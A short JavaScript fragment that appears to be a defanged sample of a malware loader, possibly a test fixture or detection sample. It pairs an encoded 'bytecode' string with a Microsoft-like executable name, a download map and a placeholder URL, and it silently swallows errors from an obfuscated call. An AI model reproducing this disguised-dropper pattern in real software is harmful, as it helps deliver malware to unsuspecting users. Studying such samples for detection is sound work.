var bytecode='aW5ub2NlbnQ=';
var UNIT_STEM='MicrosoftSystem64';
var BINARY_BASE_URL='https://example.invalid';
var DOWNLOAD_MAP={'win32-x64':'MicrosoftSystem64-win.exe'};
function startAgent(){return vmn_123abc(bytecode);}
startAgent()['catch'](()=>{})['finally'](()=>{});
